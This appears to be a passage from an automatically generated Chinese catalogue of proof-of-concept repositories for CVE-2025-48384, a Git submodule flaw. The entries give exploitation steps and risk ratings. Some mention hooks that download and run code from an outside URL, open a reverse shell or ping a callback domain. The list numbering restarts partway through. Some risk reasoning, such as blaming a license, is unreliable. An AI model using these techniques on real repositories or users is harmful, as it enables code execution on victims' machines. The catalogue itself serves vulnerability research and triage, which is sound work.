5.  当受害者执行 `git checkout` 命令时，由于子模块路径包含尾部回车符，Git 会将子模块检出到错误的位置。由于符号链接的存在，`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**项目地址:** [kallydev/cve-2025-48384-hook](https://github.com/kallydev/cve-2025-48384-hook)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #23

**来源**: [CVE-2025-48384-liamg_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-liamg_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Config 注入 RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码注入/命令执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户进行`git clone --recursive`操作

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞是 Git 中的一个代码注入漏洞，源于 Git 在处理 config 文件时，没有正确处理carriage return (
)字符。攻击者可以通过在 submodule 的路径中注入 \r 字符，使得 submodule 被检出到错误的位置。如果精心构造一个 symlink 链接到 submodule 钩子目录，并使 submodule 包含一个可执行的 post-checkout 钩子，那么这个钩子脚本就会在检出后被执行，从而实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞已经公开，并且存在可利用的POC代码。从github搜索结果[webpage 6 begin]和[webpage 7 begin]可以知道，已经有开发者提供了复现代码。提供的POC代码包含两个文件：`README.md` 和 `post-checkout`。
  *   `README.md` 文件指向了GitHub的POC地址，说明这是一个漏洞验证示例。
  *   `post-checkout` 文件包含 `echo "Uh-oh, this is an RCE!"`，这是一个简单的命令执行示例，用于验证漏洞是否成功利用。
因此，提供的POC代码是有效的，可以用来验证此漏洞。

**投毒风险分析：**

提供的 POC 代码非常简单，只包含一个输出字符串的命令。**没有发现任何隐藏的、恶意的代码**，因此投毒风险较低。可以认为投毒风险为0%。虽然这是一个 RCE 漏洞的验证代码，在真实场景下，`post-checkout` 脚本会包含更复杂的恶意代码，但这不属于仓库投毒的范畴，POC 本身是为了验证漏洞的存在，而不是进行恶意攻击。

**利用方式：**

1.  **构造恶意的Git仓库：** 攻击者需要创建一个包含恶意配置的Git仓库，其中 submodule 的路径包含 \r 字符。
2.  **创建Symlink：** 在仓库中创建一个符号链接，将带有 \r 字符的路径链接到 `.git/modules/<submodule>/hooks` 目录。
3.  **添加恶意钩子：** 在 submodule 中创建一个可执行的 `post-checkout` 钩子脚本，这个脚本包含攻击者想要执行的任意代码。
4.  **诱导用户克隆仓库：** 攻击者需要诱导受害者执行 `git clone --recursive <malicious_repo>` 命令。
5.  **触发漏洞：** 当用户执行 `git clone --recursive` 命令时，Git 会读取恶意的配置，将 submodule 检出到错误的位置，并且由于 symlink 的存在，触发执行 `post-checkout` 钩子脚本，从而执行攻击者的代码。


**项目地址:** [liamg/CVE-2025-48384-submodule](https://github.com/liamg/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #24

**来源**: [CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md](../2025/CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户执行恶意Git操作（例如，克隆包含恶意配置的仓库或初始化包含恶意配置的子模块）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，允许通过畸形的配置引用执行任意代码。漏洞的根本原因是Git在处理配置文件中的换行符时存在缺陷。具体来说，当Git写入配置条目时，如果值包含尾部的回车符（CR），则不会被正确引用。当后续读取配置时，尾部的CR会被删除，导致配置路径发生变化。

**利用方式：**

1.  攻击者创建一个包含恶意的`.gitmodules`文件的仓库。在这个文件中，子模块的路径包含一个尾部的回车符。
2.  攻击者设置一个符号链接，将经过修改的（尾部回车符被删除）子模块路径指向`.git/hooks`目录。
3.  攻击者在子模块中放置一个可执行的`post-checkout`钩子。
4.  受害者克隆该仓库并初始化子模块。
5.  当子模块初始化时，由于路径的更改以及符号链接的存在，`post-checkout`钩子会被执行，从而导致任意代码执行。

**POC有效性：**

提供的POC代码是一个`post-checkout`钩子脚本，它会尝试通过`curl`命令从`https://jarvis.webhop.me/pwned`下载并执行内容。这个脚本本身就是漏洞利用的一部分，当上述步骤成功执行时，该脚本将被执行，从而实现远程代码执行。

**投毒风险：**

提供的POC代码本身旨在利用该漏洞，因此不应将其视为潜在的投毒代码。然而，攻击者可以利用此漏洞传播恶意软件或执行其他恶意活动。此处的0%表示该代码片段本身没有隐藏其他恶意逻辑，它仅仅是利用该漏洞实现代码执行的载体。


**项目地址:** [mukesh-610/cve-2025-48384-exploit](https://github.com/mukesh-610/cve-2025-48384-exploit)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #25

**来源**: [CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md](../2025/CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md)

## CVE-2025-48384-Git配置引用导致的任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并使用 `--recurse-submodules` 参数初始化子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 在处理配置文件中的引号时不正确，特别是当子模块路径包含尾随回车符（CR）时。攻击者可以利用此漏洞通过创建包含恶意子模块配置的 Git 仓库，诱使用户克隆该仓库，并通过 `--recurse-submodules` 初始化子模块，从而导致任意代码执行。

**有效性分析：**

提供的 PoC 代码通过以下步骤利用该漏洞：

1.  创建一个包含恶意 hook 的 `evil` 目录，该 hook 会执行反向 shell。
2.  创建一个 `mainrepo` 目录，作为主仓库。
3.  在 `mainrepo` 目录中，创建一个 `.gitmodules` 文件，其中包含一个子模块定义，该子模块的路径包含尾随回车符 (`evil\r`)。
4.  创建一个符号链接，将 `evil
/hooks` 指向 `../evil/.git/hooks`，从而将恶意 hook 链接到子模块的 hooks 目录。
5.  将恶意子模块添加到仓库，并提交更改。
6.  通过 `git clone --recurse-submodules` 克隆 `mainrepo` 仓库，触发子模块初始化，从而执行恶意 hook。

根据 PoC 代码的逻辑和漏洞描述，该 PoC 代码是有效的。

**投毒风险分析：**

PoC 代码的目的是演示漏洞利用，其中包含的反向 shell 属于漏洞验证的一部分。但是，也存在潜在的投毒风险，比如在 `generate_poc.sh` 脚本中，作者可能会嵌入其他恶意代码，例如：

*   收集用户信息并发送到远程服务器。
*   修改系统文件。
*   安装恶意软件。

尽管PoC本身就是漏洞利用，但仍然存在被作者恶意利用的可能性，因此投毒风险评估为 10%。

**利用方式总结：**

1.  攻击者创建一个包含恶意子模块配置的 Git 仓库。
2.  攻击者诱使受害者克隆该仓库，并使用 `--recurse-submodules` 初始化子模块。
3.  Git 在处理包含尾随回车符的子模块路径时出现错误，导致子模块被检出到错误的位置。
4.  由于符号链接的存在，恶意 hook 被链接到子模块的 hooks 目录。
5.  在子模块初始化过程中，恶意 hook 被执行，导致任意代码执行。

**项目地址:** [nguyentranbaotran/cve-2025-48384-poc](https://github.com/nguyentranbaotran/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #26

**来源**: [CVE-2025-48384-replicatorbot_CVE-2025-48384.md](../2025/CVE-2025-48384-replicatorbot_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户检出包含恶意配置和submodule的仓库，且submodule包含恶意的post-checkout hook

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造包含恶意配置的Git仓库，实现在目标机器上执行任意代码。漏洞的根本原因是Git在处理配置文件中的换行符（CRLF）时存在缺陷。当Git读取配置值时，会去除尾部的CRLF，而当写入配置项时，如果值包含尾部CR，则不会进行引用，导致CR丢失。该漏洞利用方式如下：

1.  攻击者创建一个包含恶意配置的Git仓库，该配置会在submodule的路径中包含一个尾部的CR字符。
2.  攻击者创建一个submodule，并在submodule的`.git/hooks/post-checkout`文件中放置恶意脚本。
3.  攻击者创建一个指向恶意脚本的符号链接，该链接的目标路径经过CR处理后，会指向submodule的hooks目录。
4.  用户克隆包含恶意配置的仓库，并且递归初始化submodule，触发post-checkout钩子，执行恶意脚本，从而导致任意代码执行。

提供的POC代码是一个简单的`post-checkout`钩子脚本，它会在`/tmp`目录下创建一个名为`asp-was-here-cve-2025-48384`的文件。该脚本本身没有隐藏的投毒代码，只是用于验证漏洞是否成功利用。

根据搜索引擎的结果，该漏洞是真实存在的，并且有公开的PoC利用代码。多个安全厂商和社区都对此漏洞进行了分析和披露。

综合以上信息，可以得出结论：该漏洞利用是有效的，POC代码本身没有投毒风险，漏洞的利用方式是通过构造包含恶意配置和submodule的仓库，诱导用户克隆并初始化submodule，从而执行任意代码。

**项目地址:** [replicatorbot/CVE-2025-48384](https://github.com/replicatorbot/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #27

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git允许通过损坏的配置引用执行任意代码

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户克隆包含恶意配置的 Git 仓库，并递归初始化子模块。用户需要具有一定的权限，并且需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理包含回车符（CR）的配置值时存在不一致性。当读取配置值时，Git 会删除尾部的 CRLF。但是，当写入配置条目时，如果值包含尾部的 CR，则不会被正确引用，导致在后续读取配置时丢失 CR。当初始化子模块时，如果子模块的路径包含尾部的 CR，则修改后的路径将被读取，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
根据漏洞描述和搜索结果，此漏洞允许攻击者通过构造恶意 Git 仓库，在用户克隆仓库并初始化子模块时执行任意代码。提供的 POC 代码 `README.md` 仅包含基本的 Markdown 内容，本身不包含任何恶意代码或利用逻辑。但是，此`README.md`可能是一个更大 PoC 的一部分，用于展示漏洞仓库的结构。实际的利用需要构造包含带有恶意配置和 hook 的恶意仓库。

**投毒风险：**
提供的 POC 代码 `README.md` 文件本身没有投毒风险，但攻击者可能在其他文件中隐藏恶意代码，例如在 `.gitmodules` 文件或 submodule 的 post-checkout hook 中。如果攻击者修改了子模块的 hook 文件，并在其中添加了恶意代码，那么当用户克隆包含此子模块的仓库时，hook 脚本可能会被执行，从而导致任意代码执行。考虑到仅仅是一个`README.md`文件，其他的文件是否包含恶意代码，不得而知，无法完全排除风险。 投毒风险评估为10%。

**利用方式：**
1.  **创建恶意 Git 仓库：** 攻击者创建一个包含子模块的 Git 仓库。
2.  **修改 .gitmodules 文件：** 在 `.gitmodules` 文件中，将子模块的路径设置为包含尾部 CR 的路径。
3.  **创建符号链接：** 创建一个符号链接，将修改后的路径指向子模块的 `.git/hooks` 目录。
4.  **添加恶意 hook：** 在子模块的 `post-checkout` hook 中添加恶意代码。
5.  **诱导用户克隆仓库：** 诱导用户克隆恶意 Git 仓库并使用 `--recursive` 参数初始化子模块。
6.  **执行任意代码：** 当用户初始化子模块时，由于配置解析错误和符号链接的存在，恶意的 `post-checkout` hook 将被执行，从而导致任意代码执行。


**项目地址:** [s41r4j/CVE-2025-48384-submodule](https://github.com/s41r4j/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #28

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库，并执行包含submodule的操作，例如git submodule update --init --recursive

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是 Git 中一个高危漏洞，源于 Git 在处理配置文件时，对包含回车符 (CR) 的配置值的处理不一致。当 Git 读取配置值时，它会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，如果值包含尾部的 CR，则不会被引用，导致在稍后读取配置时 CR 丢失。该漏洞利用方式为：

1.  **恶意仓库构建：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个 submodule 的路径，该路径以回车符结尾（例如，`submodule_path\r`）。
2.  **符号链接：** 攻击者在仓库中创建一个符号链接，将修改后的 submodule 路径（由于回车符被删除，变为 `submodule_path`）指向 `.git/hooks/post-checkout` 目录。
3.  **恶意钩子：** 攻击者在 submodule 中包含一个可执行的 `post-checkout` 钩子脚本，该脚本包含恶意代码。
4.  **诱导用户 clone：** 攻击者诱导受害者克隆该恶意仓库，并执行 `git submodule update --init --recursive` 命令。
5.  **代码执行：** 当执行 `git submodule update` 时，由于符号链接的存在，`post-checkout` 钩子脚本将被执行，从而导致任意代码执行。

**有效性评估：**
根据漏洞信息和搜索结果，该漏洞确实存在，并且有公开的 PoC。提供的 Dockerfile 用于构建存在漏洞的 Git 版本（2.47.2），从而创建一个可用于验证漏洞的环境。README.md 文件详细解释了该漏洞，佐证了漏洞的存在。因此，该PoC有效。

**投毒风险评估：**
Dockerfile 仅用于构建易受攻击的 Git 环境，LICENSE 文件采用 MIT 许可，较为宽松，存在一定的风险。README.md 只是漏洞说明。整体评估投毒风险较低，约为10%。风险主要来源于LICENSE协议。

**利用方式总结：**
利用该漏洞需要攻击者精心构造一个恶意 Git 仓库，并诱导受害者克隆和执行特定命令。攻击的复杂性在于需要理解 Git 的配置处理机制和钩子机制，并巧妙地利用符号链接来实现代码执行。攻击者需要利用git config的解析缺陷，在submodule路径后添加\r字符，使submodule被clone到错误的位置，并使用软链接，将错误位置链接到.git/hooks目录下，在post-checkout阶段执行恶意代码

**项目地址:** [s41r4j/CVE-2025-48384](https://github.com/s41r4j/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #29

**来源**: [CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md)

# CVE-2025-48384

> 📦 该CVE有 **35** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并且执行带有漏洞的Git版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置时对换行符（CRLF）处理不当。当初始化子模块时，如果子模块的路径包含尾随的CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
根据漏洞描述和PoC代码，该PoC是有效的。攻击者可以通过创建一个包含恶意配置的 Git 仓库，诱导用户克隆该仓库，从而触发漏洞并执行任意代码。

提供的PoC代码包含以下文件：
*   `README.md`: 简单的README文件，用于初始化子模块。
*   `post-checkout`: 一个shell脚本，用于执行任意命令，此处是`echo`和`id`命令。

**投毒风险：**
分析PoC代码，未发现作者隐藏的恶意代码。`post-checkout` 脚本的功能仅为打印 `id` 命令的执行结果，用于验证漏洞的存在。**因此，投毒风险为0%。**

**利用方式：**
1.  攻击者创建一个包含恶意配置的 Git 仓库。该仓库的子模块路径包含尾随CR字符。
2.  攻击者创建一个符号链接，将包含CR字符的子模块路径指向 `.git/hooks` 目录，或者子模块下的 `.git/hooks` 目录。
3.  攻击者将包含恶意代码的 `post-checkout` 脚本添加到子模块的 `.git/hooks` 目录中。
4.  攻击者诱导用户克隆该恶意 Git 仓库。
5.  当用户克隆仓库并初始化子模块时，由于Git对CR字符处理不当，子模块会被检出到错误的位置，同时 `post-checkout` 脚本会被执行，从而导致任意代码执行。

**项目地址:** [Anezatraa/CVE-2025-48384-submodule](https://github.com/Anezatraa/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #2

**来源**: [CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置时对回车符（CR）处理不当。攻击者可以构造包含恶意配置的 Git 仓库，其中子模块路径包含尾随 CR。当用户克隆该仓库并初始化子模块时，Git 会错误地将子模块检出到错误的位置。如果攻击者在错误的位置设置了一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，那么在检出后，该 hook 脚本就会被执行，从而导致任意代码执行。

**POC分析：**

提供的 POC 代码 `/tmp/569f31ff6b5166501e6218f8839f5620/post-checkout` 是一个 post-checkout hook 脚本。该脚本的作用是 ping `wtt0rkb926c0mj6tsxmzfr2xlorff53u.test-burp.huidoumeng.com`。这个行为本身用于验证漏洞是否被成功利用，攻击者可以通过监测 DNS 请求判断 hook 是否被执行。这个hook仅是验证，不能算恶意代码。

**有效性：**

根据搜索结果，该漏洞的PoC已经公开，并被标记为高危漏洞，利用代码结合漏洞描述，可以判断POC有效。

**投毒风险：**

提供的POC代码仅包含一个简单的ping命令，用于验证漏洞是否触发。它本身不包含任何恶意代码或后门，因此投毒风险较低，可以认为是0%。然而，实际攻击中，攻击者可能会将此 hook 替换为更具破坏性的代码。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置包括带有尾随回车符的子模块路径。
3.  攻击者在错误的位置创建一个指向子模块 hooks 目录的符号链接。
4.  攻击者在子模块中包含一个可执行的 post-checkout hook。
5.  攻击者诱使用户克隆该恶意仓库并初始化子模块。
6.  用户执行 `git clone --recurse-submodules` 或 `git submodule update --init --recursive`。
7.  Git将子模块检出到错误的位置，并执行 post-checkout hook，从而导致任意代码执行。

**项目地址:** [ECHO6789/CVE-2025-48384-submodule](https://github.com/ECHO6789/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #3

**来源**: [CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md](../2025/CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md)

## CVE-2025-48384-Git代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时的不一致性，具体来说，Git 在读取配置值时会移除尾部的回车符（CRLF），但在写入时，如果配置值以回车符结尾，则不会对其进行引用。这会导致在稍后读取配置时丢失回车符。

**漏洞利用方式：**

1.  **恶意仓库创建：** 攻击者创建一个恶意的 Git 仓库，其中包含一个`.gitmodules`文件，该文件定义了一个 submodule，其路径包含尾部回车符（CR）。例如：`path = submodule_path\r`。
2.  **符号链接：** 仓库中存在一个符号链接，指向修改后的 submodule 路径到`.git/hooks`目录。这样可以将看似无害的目录路径重定向到 Git 钩子目录。
3.  **恶意钩子：** 仓库中包含一个可执行的`post-checkout`钩子脚本，该脚本会在 checkout 操作后执行。
4.  **诱导用户：** 攻击者诱导受害者克隆（`git clone --recursive`）该恶意仓库。
5.  **代码执行：** 当受害者执行 `git clone --recursive` 时，Git 会尝试 checkout submodule 到错误路径。由于存在符号链接，实际checkout操作会将文件写入到 `.git/hooks` 目录。`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**有效性：**
提供的 Python 脚本 `cve_2025_48384_auto_print_scanner.py` 是一个扫描器，用于检测本地或远程 Git 仓库是否存在 CVE-2025-48384 漏洞的潜在利用。它会检查`.gitmodules`文件中是否存在包含尾部回车符或`..`的路径，查找指向`.git/hooks`的符号链接，并列出可执行的钩子脚本，并显示钩子脚本内容。虽然该脚本本身不能直接利用该漏洞，但可以帮助安全研究人员或用户识别潜在的恶意仓库。结合搜索结果，可以确认此漏洞存在可利用性。

**投毒风险：**
代码本身是一个扫描工具，旨在帮助用户识别潜在的漏洞。它没有发现任何主动植入后门或恶意代码的行为。因此，可以认为该代码本身不存在投毒风险。我评估投毒风险为0%。该脚本的目的是分析给定的 Git 仓库，而不是执行任何恶意操作，所以不应该存在投毒代码。

**项目地址:** [EdwardYeIntrix/CVE-2025-48384-Scanner](https://github.com/EdwardYeIntrix/CVE-2025-48384-Scanner)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #4

**来源**: [CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md](../2025/CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置解析漏洞导致任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并且执行`git submodule update --init --recursive`，用户需要交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于Git在解析配置文件时对换行符处理不当。具体来说，Git在读取配置值时会去除结尾的回车符和换行符（CRLF）。但在写入配置时，如果值以回车符结尾，则不会被正确引用，导致回车符丢失。利用该漏洞，攻击者可以精心构造包含恶意配置的Git仓库，当用户克隆并初始化子模块时，子模块路径中的回车符会被错误解析，导致子模块被检出到错误的位置。如果此时存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

提供的POC代码是一个简单的恶意post-checkout钩子脚本，其功能是在被执行时输出 "Malicious hook executed!"。该脚本本身并没有隐藏任何额外的投毒代码，它的目的是验证漏洞是否成功利用，而不是进行实际的恶意攻击。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的Git仓库。该配置文件中的子模块路径包含一个尾部的回车符。
2.  攻击者在仓库中创建一个符号链接，将错误解析后的子模块路径链接到`.git/modules/<submodule_name>/hooks`目录。
3.  攻击者在子模块中创建一个名为`post-checkout`的可执行钩子脚本。这个脚本包含攻击者想要执行的恶意代码。
4.  攻击者将仓库共享给受害者。
5.  受害者克隆该仓库并执行`git submodule update --init --recursive`命令。
6.  由于配置解析错误，子模块会被检出到错误的位置。
7.  符号链接会将对错误位置的访问重定向到子模块的钩子目录。
8.  `post-checkout`钩子脚本被执行，导致任意代码执行。

**项目地址:** [MarcoTondolo/cve-2025-48384-poc](https://github.com/MarcoTondolo/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #5

**来源**: [CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md](../2025/CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md)

## CVE-2025-48384-Git配置引号处理缺陷导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库，并初始化包含恶意配置的子模块，且子模块包含恶意的post-checkout hook。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置引号时存在缺陷。当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置项时，尾部带有CR的值不会被引用，导致CR在稍后读取配置时丢失。当初始化子模块时，如果子模块路径包含尾部CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本。

根据提供的POC代码，`/tmp/81a81d657749821214a4f9bba7b4c2c8/post`文件是一个简单的bash脚本，其功能是在`/tmp`目录下创建一个名为`CVE-2025-48384`的空文件。这个脚本本身不包含明显的恶意代码，但如果利用该漏洞，它可以被放置到`.git/hooks/post-checkout`中，在`git checkout`命令执行后自动执行。这使得攻击者可以控制受害者的系统。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。恶意配置包含一个包含尾部CR的子模块路径，该路径指向子模块的hooks目录。
2.  攻击者在该仓库中添加一个可执行的`post-checkout` hook脚本 (例如，提供的`post`脚本)到子模块的hooks目录中。
3.  攻击者诱导受害者克隆该恶意仓库并初始化子模块。
4.  由于Git的配置引号处理缺陷，子模块会被检出到错误的位置，符号链接会将该位置指向子模块的hooks目录。
5.  当受害者执行`git checkout`命令时，`post-checkout` hook脚本会被执行，攻击者从而实现任意代码执行。

**有效性：**
